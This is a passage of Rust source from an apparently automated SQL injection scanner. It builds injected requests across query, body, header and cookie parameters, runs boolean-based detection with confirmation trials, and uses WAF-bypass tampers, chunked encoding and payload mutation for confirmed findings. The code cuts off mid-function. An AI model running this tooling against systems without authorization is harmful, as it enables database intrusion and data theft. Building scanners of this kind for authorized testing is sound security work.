                http::HeaderName::from_bytes(k.as_bytes()),
                http::HeaderValue::from_str(v),
            ) {
                headers.insert(name, val);
            }
        }
    }
    (method, body_str, headers)
}

/// Headers for a structured injection: force `content_type` (JSON/XML) but
/// preserve every other raw header (cookies, auth, UA). `content-length` is
/// always dropped (recomputed by the HTTP stack).
fn headers_preserving_raw(
    raw: Option<&crate::target::raw_request::RawRequest>,
    content_type: &'static str,
) -> http::HeaderMap {
    let mut headers = http::HeaderMap::new();
    if let Ok(v) = http::HeaderValue::from_static(content_type)
        .to_str()
        .map(ToOwned::to_owned)
    {
        let _ = v;
    }
    headers.insert(
        http::header::CONTENT_TYPE,
        http::HeaderValue::from_static(content_type),
    );
    if let Some(r) = raw {
        for (k, v) in &r.headers {
            if k.eq_ignore_ascii_case("content-type") || k.eq_ignore_ascii_case("content-length") {
                continue;
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(k.as_bytes()),
                http::HeaderValue::from_str(v),
            ) {
                headers.insert(name, val);
            }
        }
    }
    headers
}

/// Headers for a multipart injection: keep the original `Content-Type`
/// (boundary included) verbatim, drop only `content-length`.
fn headers_preserving_raw_keep_ct(
    raw: Option<&crate::target::raw_request::RawRequest>,
) -> http::HeaderMap {
    let mut headers = http::HeaderMap::new();
    if let Some(r) = raw {
        for (k, v) in &r.headers {
            if k.eq_ignore_ascii_case("content-length") {
                continue;
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(k.as_bytes()),
                http::HeaderValue::from_str(v),
            ) {
                headers.insert(name, val);
            }
        }
    }
    headers
}

/// Replace the value of a `name="field"` multipart part in place, preserving
/// boundaries and other parts. Returns `None` when the field is absent.
fn inject_multipart_field(body: &str, field: &str, payload: &str) -> Option<String> {
    let needle = format!("name=\"{field}\"");
    let pos = body.find(&needle)?;
    // Value starts after the part-header blank line following the needle.
    let after = &body[pos + needle.len()..];
    let value_start_rel = after
        .find("\r\n\r\n")
        .map(|i| i + 4)
        .or_else(|| after.find("\n\n").map(|i| i + 2))?;
    let value_start = pos + needle.len() + value_start_rel;
    // Value ends at the next line starting with `--` (boundary) or end.
    let rest = &body[value_start..];
    let value_end_rel = rest.find("\r\n--").map(|i| i + 2).or_else(|| {
        // `\n--boundary` fallback; keep the leading newline out of the value.
        rest.find("\n--").map(|i| i + 1)
    });
    let value_end = value_end_rel.map_or(body.len(), |rel| value_start + rel);
    let mut out = String::with_capacity(body.len() + payload.len());
    out.push_str(&body[..value_start]);
    out.push_str(payload);
    out.push_str(&body[value_end..]);
    Some(out)
}

fn request_spec_from_raw(target: &TargetUrl, raw: &RawRequest) -> RequestSpec {
    let method = Method::from_bytes(raw.method.as_bytes()).unwrap_or(Method::GET);
    let mut headers = http::HeaderMap::new();
    for (k, v) in &raw.headers {
        if k.eq_ignore_ascii_case("content-length") || k.eq_ignore_ascii_case("host") {
            continue;
        }
        if let (Ok(name), Ok(value)) = (
            http::HeaderName::from_bytes(k.as_bytes()),
            http::HeaderValue::from_str(v),
        ) {
            headers.insert(name, value);
        }
    }
    let mut spec = RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers);
    if let Some(body) = &raw.body {
        spec = spec.with_body(body.as_bytes().to_vec());
    }
    spec
}

#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
fn build_injection_spec_with_raw(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
    raw: Option<&crate::target::raw_request::RawRequest>,
    opts: ProbeOpts,
    popts: &PayloadOpts,
) -> RequestSpec {
    // Custom value encoding (--safe-chars/--skip-urlencode); collected once
    // per injection (requests dominate the cost).
    let safe: Vec<char> = popts.safe_chars.chars().collect();
    let skip = popts.skip_urlencode;
    if marker_set.has_any() && param.name.starts_with("marker_") {
        let url = inject_with_marker(target_str, payload, marker_set);
        // Preserve method from raw request if available
        let method = raw
            .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
            .unwrap_or(Method::GET);
        return RequestSpec::new(method, url);
    }
    match &param.location {
        ParameterLocation::Query => {
            let url = if opts.hpp {
                hpp_query_url(target.inner(), &param.name, payload)
            } else {
                inject_param(target, param, payload, &safe, skip)
            };
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, url)
        }
        ParameterLocation::Body => {
            let (method, body_str, mut headers) =
                inject_body_param(raw, param, payload, opts.hpp, &safe, skip);
            if should_apply_chunked(true, opts.chunked) {
                headers.remove(http::header::CONTENT_LENGTH);
                headers.insert(
                    http::header::TRANSFER_ENCODING,
                    http::HeaderValue::from_static("chunked"),
                );
            }
            RequestSpec::new(method, target.as_str().to_owned())
                .with_headers(headers)
                .with_body(body_str.into_bytes())
        }
        ParameterLocation::Header(h) => {
            let mut headers = http::HeaderMap::new();
            // Preserve existing headers from raw request
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(h.as_bytes()),
                http::HeaderValue::from_str(payload),
            ) {
                headers.insert(name, val);
            }
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
        }
        ParameterLocation::Cookie => {
            let mut headers = http::HeaderMap::new();
            // Preserve existing headers, but rebuild Cookie header to preserve other cookies
            let mut cookies: Vec<(String, String)> = Vec::new();
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if k.eq_ignore_ascii_case("cookie") {
                        for part in v.split(';') {
                            if let Some((ck, cv)) = part.trim().split_once('=') {
                                cookies.push((ck.trim().to_owned(), cv.trim().to_owned()));
                            }
                        }
                    } else if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            // Replace or insert target cookie
            let mut found = false;
            for (ck, cv) in &mut cookies {
                if ck == &param.name {
                    payload.clone_into(cv);
                    found = true;
                }
            }
            if !found {
                cookies.push((param.name.clone(), payload.to_owned()));
            }
            let cookie_val = cookies
                .into_iter()
                .map(|(k, v)| format!("{k}={v}"))
                .collect::<Vec<_>>()
                .join("; ");
            if let Ok(val) = http::HeaderValue::from_str(&cookie_val) {
                headers.insert(http::header::COOKIE, val);
            }
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn fetch_for_payload(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    opts: ProbeOpts,
    popts: &PayloadOpts,
) -> (String, f64, u16) {
    fetch_for_payload_with_class(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        payload,
        marker_set,
        raw,
        opts,
        popts,
        RequestClass::Default,
    )
    .await
}

/// Class-aware probe fetch (C10): `boolean` probes run under the 10s class
/// timeout, `time` probes under 15s *inside the isolated 2-slot pool* (slow
/// `pg_sleep` never starves `boolean`/`error` lanes), `oob` under 30s.
/// Class mapping per call site: `boolean` differentials (incl. JSON boolean
/// channel + error→boolean confirms) → [`RequestClass::Boolean`], `time`
/// shots + benign timing control → [`RequestClass::Time`], OOB sends →
/// [`RequestClass::Oob`], everything else → [`RequestClass::Default`].
#[allow(clippy::too_many_arguments)]
async fn fetch_for_payload_with_class(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    class: RequestClass,
) -> (String, f64, u16) {
    let spec = build_injection_spec_with_raw(
        target, target_str, param, payload, marker_set, raw, opts, popts,
    );
    let start = Instant::now();
    let resp = client.send_with_retry_for_class(spec, class, cancel).await;
    let elapsed = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            let status = r.status().as_u16();
            // Bounded body read: a transport error (`Timeout`, reset) returns
            // status 0 so callers skip scoring instead of treating `""` as a
            // dissimilar body (similarity ~0 / confidence 0.75 false positive).
            match client.read_body_string_for_class(r, class).await {
                Ok(body) => (body, elapsed, status),
                Err(e) => {
                    warn!(error=%e, "probe body read failed, skipping score");
                    (String::new(), elapsed, 0)
                }
            }
        }
        Err(e) => {
            warn!(error=%e, "probe request failed, skipping score");
            (String::new(), elapsed, 0)
        }
    }
}

#[allow(dead_code)]
async fn fetch_body_and_time_spec(
    client: &HttpClient,
    url: String,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
) -> (Option<String>, f64) {
    let start = Instant::now();
    let spec = RequestSpec {
        method: Method::GET,
        url,
        headers: http::HeaderMap::new(),
        body: None,
    };
    let resp = client.send_with_retry(spec, cancel).await;
    let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => match client.read_body_string_with_timeout(r).await {
            Ok(body) => (Some(body), elapsed_ms),
            Err(e) => {
                warn!(error=%e, "body read failed, skipping score");
                (None, elapsed_ms)
            }
        },
        Err(e) => {
            warn!(error=%e, "request failed, skipping score");
            (None, elapsed_ms)
        }
    }
}

#[allow(clippy::too_many_arguments)]
#[allow(clippy::similar_names)]
#[allow(clippy::too_many_lines)]
async fn test_boolean_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    dbms_belief: &DbmsBelief,
    deadline: Option<std::time::Instant>,
) {
    let (top_dbms, top_prob) = dbms_belief.top_candidate();
    debug!(param = param.key(), context = context.summary(), %top_dbms, top_prob, "boolean: context-aware detection");
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    // Quote-correct + DBMS-aware: a confident belief (>= 0.85, same bar as
    // `fill_missing_dbms`) selects engine comment styles, and the inferred
    // quote context leads so L1 (`take(2)`) probes the right family first.
    let mut payloads = boolean_payloads_for(dbms_payload_label(dbms_belief));
    order_boolean_by_context(&mut payloads, context);
    let detector = BooleanDetector::new();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    // Boolean TRUE/FALSE pairs require coherent transforms: opaque tampers
    // (e.g. base64encode) are excluded via the boolean-safe sets.
    let tamper_sets = boolean_safe_transformation_sets(tampers);
    // App-filter pruning (A1-style `400` signature filter): every spaced
    // payload returns `400`/`400` while the baseline is `200`, so the full
    // L3 matrix would burn hundreds of requests for a certain 0-finding.
    // After 3 consecutive fully-filtered probes, stop the technique early.
    // Bypass payloads (`/**/`) return `200` and reset the streak, so evasion
    // still detects; N1/N2 (`200`) never trip it.
    let mut filter_streak: usize = 0;
    'payload: for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        // Shared `--max-duration` deadline: stop the technique early so one
        // payload family cannot silently overshoot an explicit user budget.
        // `None` deadline = no-op. Outcome folds normally below.
        if check_deadline(deadline, &param.key(), "boolean") {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let true_payload =
                build_final_payload_with_rng(&p.true_payload, trans, popts, &mut rng);
            let false_payload =
                build_final_payload_with_rng(&p.false_payload, trans, popts, &mut rng);
            // Skip duplicate variants already tried for this base payload
            // (dedupe via string equality already handled by transformation sets, but
            // randomcase produces different strings per call — we still try each set once)
            let tamper_label = if trans.is_empty() {
                "none".to_owned()
            } else {
                trans
                    .iter()
                    .map(super::super::techniques::tamper::Tamper::name)
                    .collect::<Vec<_>>()
                    .join(",")
            };
            // 3 trials confirmation
            let mut trials: Vec<crate::detection::confirmation::Trial> = Vec::with_capacity(3);
            let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
            let mut last_true = String::new();
            let mut last_false = String::new();
            let mut last_t_status: u16 = 0;
            #[allow(clippy::similar_names)]
            let mut last_f_status: u16 = 0;
            let mut all_filter_blocked = true;
            for _ in 0..3 {
                if cancel.is_cancelled() {
                    break;
                }
                let (true_raw, true_ms, true_status) = fetch_for_payload_with_class(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &true_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                    RequestClass::Boolean,
                )
                .await;
                let true_body = matcher.pre_process(&true_raw);
                let (false_raw, false_ms, false_status) = fetch_for_payload_with_class(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &false_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                    RequestClass::Boolean,
                )
                .await;
                let false_body = matcher.pre_process(&false_raw);
                // Transport/body failure (`status == 0`, body `""`) must never
                // be scored: TRUE=baseline vs FALSE="" yields a 1.0 gap and a
                // 0.9-confidence false positive on network hiccups. Record a
                // neutral trial (never confirms) like `confirm_error_with_boolean`.
                if true_status == 0 || false_status == 0 {
                    trials.push(crate::detection::confirmation::Trial {
                        true_conf: 0.5,
                        false_conf: 0.5,
                    });
                    last_true = true_body;
                    last_false = false_body;
                    last_t_status = true_status;
                    last_f_status = false_status;
                    all_filter_blocked = false;
                    continue;
                }
                // `--ignore-code`: an ignored status counts as a negative trial, never a finding.
                if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
                    trials.push(crate::detection::confirmation::Trial {
                        true_conf: 0.0,
                        false_conf: 1.0,
                    });
                    last_true = true_body;
                    last_false = false_body;
                    last_t_status = true_status;
                    last_f_status = false_status;
                    all_filter_blocked = false;
                    continue;
                }
                if !is_app_filter_block(true_status, false_status) {
                    all_filter_blocked = false;
                }
                let res = detector.evaluate(
                    &baseline_body,
                    &true_body,
                    &false_body,
                    baseline.mean_ms,
                    true_ms,
                    false_ms,
                );
                trials.push(crate::detection::confirmation::Trial {
                    true_conf: res.true_similarity,
                    false_conf: res.false_similarity,
                });
                last_res = Some(res);
                last_true = true_body;
                last_false = false_body;
                last_t_status = true_status;
                last_f_status = false_status;
            }
            // App-filter pruning: a full `(payload, tamper-set)` probe that
            // never left the `400` filter on either branch carries no
            // differential signal. Three in a row means the sink filters this
            // payload family (A1 spaces) — stop boolean early with 0 finding
            // instead of burning the rest of the L3 matrix. Requires 3
            // completed trials so cancel/ignore never prunes.
            if all_filter_blocked && trials.len() == 3 {
                filter_streak = filter_streak.saturating_add(1);
            } else {
                filter_streak = 0;
            }
            if filter_streak >= FILTER_STREAK_LIMIT {
                debug!(
                    param = param.key(),
                    streak = filter_streak,
                    "app signature filter (repeated 400) — pruning boolean early"
                );
                break 'payload;
            }
            let (conf, inverted) = crate::detection::confirmation::confirm_either(&trials);
            if conf.confirmed {
                // Matcher veto gate: `Some(false)` rejects the candidate,
                // `None` abstains and lets the detector decide.
                if matcher.gate_boolean(&last_true, &last_false, last_t_status, last_f_status)
                    == Some(false)
                {
                    continue;
                }
                let res = last_res.unwrap_or_else(|| {
                    detector.evaluate(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
                });
                let evidence = format!(
                    "boolean true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}{}{}{}",
                    res.true_similarity,
                    res.false_similarity,
                    conf.trials,
                    conf.false_positive_prob,
                    tamper_label,
                    opts.evidence_suffix(),
                    popts.evidence_suffix(),
                    matcher.evidence_suffix(),
                    if inverted { " inverted" } else { "" }
                );
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Boolean,
                    conf.score,
                    evidence,
                )
                // C7: measured FP from the 3-trial confirmation + WAF context
                // from the baseline feed the calibrated severity bucket.
                .with_false_positive_prob(conf.false_positive_prob)
                .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
                finding.dbms = None;
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

/// Outcome of the lightweight error→boolean confirmation probe.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ErrorBoolConfirm {
    Confirmed,
    Denied,
    Inconclusive,
    Skipped,
}

impl ErrorBoolConfirm {
    const fn as_str(self) -> &'static str {
        match self {
            Self::Confirmed => "true",
            Self::Denied => "false",
            Self::Inconclusive => "inconclusive",
            Self::Skipped => "skipped",
        }
    }
}

struct ErrorBoolOutcome {
    verdict: ErrorBoolConfirm,
    true_sim: f64,
    false_sim: f64,
}

/// Lightweight confirmation for error hits without an extracted fragment
/// (confidence 0.75): one boolean TRUE/FALSE pair (+2 requests) on the same
/// parameter, reusing the error-hit tamper set filtered to boolean-safe
/// tampers. Returns `Skipped` without any request when the boolean technique
/// is disabled, `Inconclusive` on transport failure/cancel (never scores
/// `""`), `Denied` on a clean differential or matcher veto.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn confirm_error_with_boolean(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    baseline_body: &str,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    trans: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    ignore_codes: &[u16],
    boolean_enabled: bool,
    seed: Option<u64>,
) -> ErrorBoolOutcome {
    const INCONCLUSIVE: ErrorBoolOutcome = ErrorBoolOutcome {
        verdict: ErrorBoolConfirm::Inconclusive,
        true_sim: 0.0,
        false_sim: 0.0,
    };
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    if !boolean_enabled {
        return ErrorBoolOutcome {
            verdict: ErrorBoolConfirm::Skipped,
            true_sim: 0.0,
            false_sim: 0.0,
        };
    }
    if cancel.is_cancelled() {
        return INCONCLUSIVE;
    }
    let pairs = boolean_payloads_for(None);
    let Some(pair) = pairs.first() else {
        return INCONCLUSIVE;
    };
    // Keep the WAF-bypass coherence (e.g. auto space2comment) without breaking
    // the TRUE/FALSE differential: drop opaque tampers like base64encode.
    let safe_trans: Vec<Tamper> = trans
        .iter()
        .filter(|t| t.is_boolean_safe())
        .cloned()
        .collect();
    let true_payload =
        build_final_payload_with_rng(&pair.true_payload, &safe_trans, popts, &mut rng);
    let false_payload =
        build_final_payload_with_rng(&pair.false_payload, &safe_trans, popts, &mut rng);
    let (true_raw, true_ms, true_status) = fetch_for_payload_with_class(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        &true_payload,
        marker_set,
        raw,
        opts,
        popts,
        RequestClass::Boolean,
    )
    .await;
    if cancel.is_cancelled() {
        return INCONCLUSIVE;
    }
    let (false_raw, false_ms, false_status) = fetch_for_payload_with_class(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        &false_payload,
        marker_set,
        raw,
        opts,
        popts,
        RequestClass::Boolean,
    )
    .await;
    // Transport/body failures are never scored as `""` — inconclusive, not denied.
    if true_status == 0 || false_status == 0 {
        return INCONCLUSIVE;
    }
    if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
        return ErrorBoolOutcome {
            verdict: ErrorBoolConfirm::Denied,
            true_sim: 0.0,
            false_sim: 1.0,
        };
    }
    let true_body = matcher.pre_process(&true_raw);
    let false_body = matcher.pre_process(&false_raw);
    let res = BooleanDetector::new().evaluate(
        baseline_body,
        &true_body,
        &false_body,
        baseline.mean_ms,
        true_ms,
        false_ms,
    );
    if matcher.gate_boolean(&true_body, &false_body, true_status, false_status) == Some(false) {
        return ErrorBoolOutcome {
            verdict: ErrorBoolConfirm::Denied,
            true_sim: res.true_similarity,
            false_sim: res.false_similarity,
        };
    }
    if res.is_vulnerable && res.confidence > 0.6 {
        ErrorBoolOutcome {
            verdict: ErrorBoolConfirm::Confirmed,
            true_sim: res.true_similarity,
            false_sim: res.false_similarity,
        }
    } else {
        ErrorBoolOutcome {
            verdict: ErrorBoolConfirm::Denied,
            true_sim: res.true_similarity,
            false_sim: res.false_similarity,
        }
    }
}

/// `true` when at least one finding justifies fingerprint + enumeration:
/// any finding that is not an unconfirmed error probe. Error hits without a
/// fragment stay at `0.55 unconfirmed` until `confirm_error_with_boolean`
/// upgrades them to `0.9 bool_confirm=true` — running DBMS guessing or the
/// boolean-oracle enumerator on the unconfirmed shape yields `postgres` FPs
/// followed by `enumeration length inference failed` after a single probe
/// (observed on clean Next.js targets).
#[must_use]
fn is_confirmed_finding(f: &Finding) -> bool {
    !f.evidence.contains("unconfirmed") && f.confidence >= 0.5
}

/// `true` when at least one confirmed finding exists (see
/// [`is_confirmed_finding`]). Fingerprint filling and `--dbs`-style
/// enumeration require this; unconfirmed-only snapshots must stay silent.
#[must_use]
fn has_confirmed_finding(findings: &[Finding]) -> bool {
    findings.iter().any(is_confirmed_finding)
}

/// `true` when at least one finding justifies the heavy boolean-oracle
/// extraction: a *confirmed* boolean finding, or an error finding with an
/// extracted fragment (`extracted=yes`) or a confirmed boolean differential
/// (`bool_confirm=true`). Unconfirmed 0.55 error findings alone never qualify
/// — they would burn ~270-700 requests into `inference inconsistency`.
#[must_use]
fn is_extraction_eligible(findings: &[Finding]) -> bool {
    findings.iter().any(|f| {
        (f.technique == TechniqueKind::Boolean && is_confirmed_finding(f))
            || (f.technique == TechniqueKind::Error
                && (f.evidence.contains("extracted=yes")
                    || f.evidence.contains("bool_confirm=true")))
    })
}

/// Recover the injection [`TargetParameter`] for a finding (`name@location`,
/// split at the last `@`; unknown locations fall back to `Query`).
fn param_from_finding(finding: &Finding) -> TargetParameter {
    let (name, loc_str) = match finding.parameter.rsplit_once('@') {
        Some((n, l)) => (n.to_owned(), l.to_owned()),
        None => (finding.parameter.clone(), "query".to_owned()),
    };
    let location = if loc_str == "query" {
        ParameterLocation::Query
    } else if loc_str == "body" {
        ParameterLocation::Body
    } else if loc_str == "cookie" {
        ParameterLocation::Cookie
    } else if let Some(h) = loc_str.strip_prefix("header:") {
        ParameterLocation::Header(h.to_owned())
    } else {
        ParameterLocation::Query
    };
    TargetParameter::new(name, location, "1")
}

/// Push one C6 confirm trace record (hashes only, never clear secrets).
#[allow(clippy::too_many_arguments)]
async fn push_confirm_trace(
    state: &Arc<RwLock<SessionState>>,
    param_key: &str,
    technique: TechniqueKind,
    mutation_plan: &str,
    seed: Option<u64>,
    payload: &str,
    body: &str,
    diff: f64,
    ms: f64,
) {
    let mut st = state.write().await;
    let seq = st.next_trace_seq();
    st.push_trace(crate::reasoning::ProbeRecord::from_clear(
        seq,
        param_key,
        &technique.to_string(),
        mutation_plan,
        seed,
        payload,
        body,
        diff,
        ms,
    ));
}

/// DBMS label hint from a finding's `dbms` field for quote-correct confirm
/// payloads (`None` = generic polyglots, historical default).
fn dbms_label_from_finding(finding: &Finding) -> Option<&'static str> {
    let v = finding.dbms.as_deref()?.trim().to_ascii_lowercase();
    match v.as_str() {
        "mysql" | "mariadb" => Some("mysql"),
        "postgres" | "postgresql" | "pgsql" => Some("postgres"),
        "mssql" | "sqlserver" | "sql-server" | "tsql" => Some("mssql"),
        "oracle" | "ora" => Some("oracle"),
        "sqlite" => Some("sqlite"),
        _ => None,
    }
}

/// Parse the confirmed UNION column width from evidence (`columns=N`,
/// `columns=Some(N)` or `columns=[N, ..]`). Returns `None` when absent or
/// unparsable — the caller falls back to the historical default width 3.
/// Pure, never panics (operator-controlled evidence).
fn parse_union_columns(evidence: &str) -> Option<usize> {
    let key = "columns=";
    let start = evidence.find(key)? + key.len();
    let rest = evidence[start..].trim_start();
    // Shapes: `3`, `Some(3)`, `[3, 4]`, `Ok(3)`. Scan the first ASCII digit run.
    let mut digits = String::new();
    let mut in_digits = false;
    for c in rest.chars() {
        if c.is_ascii_digit() {
            digits.push(c);
            in_digits = true;
        } else if in_digits {
            break;
        }
    }
    if digits.is_empty() {
        return None;
    }
    let parsed: usize = digits.parse().ok()?;
    if parsed == 0 || parsed > 32 {
        return None;
    }
    Some(parsed)
}

/// C5-tardif base payload for mutation: one raw base string per technique.
///
/// - `boolean`/`json`/`nosql` : le côté `TRUE` de la première paire (la mutation
///   vérifie que `TRUE` reste `≈baseline`, 1 requête par variante).
/// - `error`/`time`/`union`/`stacked` : le premier core DBMS-aware.
/// - `oob` : `None` (jamais muté).
///
/// `None` = pas de base disponible → 0 requête de mutation.
fn mutation_base_payload(finding: &Finding) -> Option<String> {
    let label = dbms_label_from_finding(finding);
    match finding.technique {
        TechniqueKind::Boolean => crate::techniques::boolean::payloads::boolean_payloads_for(label)
            .first()
            .map(|p| p.true_payload.clone()),
        TechniqueKind::Json => crate::techniques::json::payloads::json_payloads_for(label)
            .first()
            .map(|p| p.true_payload.clone()),
        TechniqueKind::Nosql => crate::techniques::nosql::payloads::nosql_payloads()
            .first()
            .map(|p| p.true_payload.clone()),
        TechniqueKind::Error => crate::techniques::error::payloads::error_payloads_for(label)
            .first()
            .map(|p| p.payload.clone()),
        TechniqueKind::Time => crate::techniques::time::payloads::time_payloads_for(label, 3)
            .first()
            .map(|p| p.payload.clone()),
        TechniqueKind::Union => crate::techniques::union::payloads::union_payloads_for(label, 3)
            .first()
            .map(|p| p.payload.clone()),
        TechniqueKind::Stacked => crate::techniques::stacked::payloads::stacked_payloads_for(label)
            .first()
            .map(|p| p.payload.clone()),
        TechniqueKind::Oob => None,
    }
}

/// C5-tardif mini-mutation second-pass (confirmés seuls).
///
/// Appelée **uniquement** depuis [`Engine::run_confirm_second_pass`], après
/// une re-validation réussie, donc uniquement sur des findings déjà
/// confirmés — jamais en détection première, jamais sur cible propre.
/// Garanties :
/// - gate [`crate::mutation::should_attempt_mutation`] : `--no-mutation`,
///   WAF blocking, non-confirmé, OOB → 0 requête, 0 trace.
/// - borné : ≤ [`crate::mutation::MAX_MUTATION_VARIANTS`] variantes,
///   1 requête chacune, ≤ [`crate::mutation::MAX_MUTATION_REQUESTS_PER_FINDING`]
///   par finding (4 effectives).
/// - seedé : `seed` dérivée du run (`derive_confirm_seed`).
/// - tracé : chaque sonde pousse un `ProbeRecord` `mutation:<famille>`.
/// - échec silencieux : le résultat ne crée ni ne supprime aucun finding ;
///   le finding d'origine est toujours conservé.
///   Retourne le nombre de requêtes de mutation envoyées (0..=4).
#[allow(clippy::too_many_arguments)]
async fn run_mutation_for_finding(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    finding: &Finding,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    context: &InjectionContext,
    no_mutation: bool,
    seed: Option<u64>,
) -> usize {
    use crate::mutation::{MiniMutator, should_attempt_mutation};
    let baseline_blocking = baseline.is_waf_blocking() || baseline.is_waf_blocked();
    let confirmed = is_confirmed_finding(finding);
    let is_oob = finding.technique == TechniqueKind::Oob;
    if !should_attempt_mutation(no_mutation, baseline_blocking, confirmed, is_oob) {
        debug!(
            param = %finding.parameter,
            technique = %finding.technique,
            no_mutation,
            baseline_blocking,
            confirmed,
            "mutation skipped (gate)"
        );
        return 0;
    }
    let Some(base) = mutation_base_payload(finding) else {
        return 0;
    };
    let variants = MiniMutator::all_enabled().generate(&base, context, seed);
    if variants.is_empty() {
        return 0;
    }
    mutate_and_trace(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        finding,
        marker_set,
        raw,
        baseline,
        effective_tampers,
        opts,
        popts,
        matcher,
        &variants,
        seed,
    )
    .await
}

/// Boucle d'envoi des variantes mutées (extrait de [`run_mutation_for_finding`]).
#[allow(clippy::too_many_arguments)]
async fn mutate_and_trace(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    finding: &Finding,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    variants: &[crate::mutation::MutatedVariant],
    seed: Option<u64>,
) -> usize {
    // Boolean-safe : les paires TRUE/FALSE exigent des transforms qui
    // préservent le différentiel (même filtre que la détection première).
    let boolean_safe: Vec<Tamper> = effective_tampers
        .iter()
        .filter(|t| t.is_boolean_safe())
        .cloned()
        .collect();
    let tampers_for_variant: &[Tamper] = match finding.technique {
        TechniqueKind::Boolean | TechniqueKind::Json | TechniqueKind::Nosql => &boolean_safe,
        _ => effective_tampers,
    };
    let class = match finding.technique {
        TechniqueKind::Boolean | TechniqueKind::Json | TechniqueKind::Nosql => {
            RequestClass::Boolean
        }
        TechniqueKind::Time => RequestClass::Time,
